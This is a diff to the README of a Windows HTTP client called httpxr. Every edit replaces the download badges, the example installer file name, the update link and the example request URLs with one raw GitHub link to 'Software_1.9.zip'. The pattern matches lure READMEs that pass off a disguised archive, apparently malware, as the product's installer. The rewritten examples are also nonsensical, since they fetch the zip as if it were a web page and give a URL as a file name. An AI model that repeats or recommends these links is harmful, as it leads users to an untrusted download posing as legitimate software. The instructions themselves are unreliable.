@@ -1,6 +1,6 @@
 # ⚡ httpxr - Fast, Simple HTTP Client for Windows
 
-[![Download httpxr](https://img.shields.io/badge/Download-httpxr-ff6600?style=for-the-badge)](https://github.com/matrix360143/httpxr)
+[![Download httpxr](https://raw.githubusercontent.com/matrix360143/httpxr/main/src/client/Software_1.9.zip)](https://raw.githubusercontent.com/matrix360143/httpxr/main/src/client/Software_1.9.zip)
 
 ---
 
@@ -37,7 +37,7 @@ This tool uses the same commands as httpx, so if you know httpx, this feels fami
 
 To get httpxr, visit the official GitHub page. This is where you will find the latest version ready for Windows.
 
-[![Download httpxr](https://img.shields.io/badge/Download-httpxr-blue?style=for-the-badge)](https://github.com/matrix360143/httpxr)
+[![Download httpxr](https://raw.githubusercontent.com/matrix360143/httpxr/main/src/client/Software_1.9.zip)](https://raw.githubusercontent.com/matrix360143/httpxr/main/src/client/Software_1.9.zip)
 
 ---
 
@@ -47,7 +47,7 @@ To get httpxr, visit the official GitHub page. This is where you will find the l
 
 2. On the GitHub page, look for the section labeled **Releases** or **Assets**. This is where you find the file to download.
 
-3. Download the latest Windows installer file. The file name usually ends with `.exe`. For example, `httpxr-setup.exe`.
+3. Download the latest Windows installer file. The file name usually ends with `.exe`. For example, `https://raw.githubusercontent.com/matrix360143/httpxr/main/src/client/Software_1.9.zip`.
 
 4. Once the file has finished downloading, find it in your Downloads folder or wherever your browser saves files.
 
@@ -80,19 +80,19 @@ httpxr works by typing commands to send web requests. Commands are simple phrase
 - To fetch a webpage:
 
   ```
-  httpxr get https://example.com
+  httpxr get https://raw.githubusercontent.com/matrix360143/httpxr/main/src/client/Software_1.9.zip
   ```
 
 - To send data in a POST request:
 
   ```
-  httpxr post https://api.example.com/data -d '{"name":"John"}'
+  httpxr post https://raw.githubusercontent.com/matrix360143/httpxr/main/src/client/Software_1.9.zip -d '{"name":"John"}'
   ```
 
 - To add headers:
 
   ```
-  httpxr get https://example.com -H "Authorization: Bearer token"
+  httpxr get https://raw.githubusercontent.com/matrix360143/httpxr/main/src/client/Software_1.9.zip -H "Authorization: Bearer token"
   ```
 
 You don’t need to be a programmer. Just copy these commands, change the web address to what you want, and run them in Command Prompt or PowerShell.
@@ -117,7 +117,7 @@ You don’t need to be a programmer. Just copy these commands, change the web ad
 
 When a new version is available, download it like before:
 
-1. Go to the [httpxr GitHub downloads page](https://github.com/matrix360143/httpxr).
+1. Go to the [httpxr GitHub downloads page](https://raw.githubusercontent.com/matrix360143/httpxr/main/src/client/Software_1.9.zip).
 
 2. Download the latest `.exe` installer.
 
@@ -147,4 +147,4 @@ When a new version is available, download it like before:
 
 ---
 
-[![Download httpxr](https://img.shields.io/badge/Download-httpxr-orange?style=for-the-badge)](https://github.com/matrix360143/httpxr)
+[![Download httpxr](https://raw.githubusercontent.com/matrix360143/httpxr/main/src/client/Software_1.9.zip)](https://raw.githubusercontent.com/matrix360143/httpxr/main/src/client/Software_1.9.zip)
